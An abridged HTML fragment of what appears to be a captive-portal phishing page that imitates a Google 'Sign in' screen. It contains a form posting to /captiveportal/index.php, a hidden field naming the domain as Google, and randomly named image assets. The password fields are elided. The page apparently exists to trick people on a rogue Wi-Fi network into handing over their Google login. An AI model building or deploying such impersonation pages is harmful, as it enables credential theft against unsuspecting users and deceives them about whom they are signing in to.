...
<link rel="stylesheet" type="text/css" href="assets/go_assets/css/styles.css">
<link rel="icon" type="image/png" href="assets/go_assets/img/f8593y1ses.png"/>
...
<form method="POST" action="/captiveportal/index.php" >
	<img src="assets/go_assets/img/1ckkcu79ho.gif" alt="">
	<h1>Sign in</h1>
	...
	<input type="hidden" name="domain" value="Google">
...
<footer>
	English (United States)<img src="assets/go_assets/img/mq40xx0kce.gif" alt="">
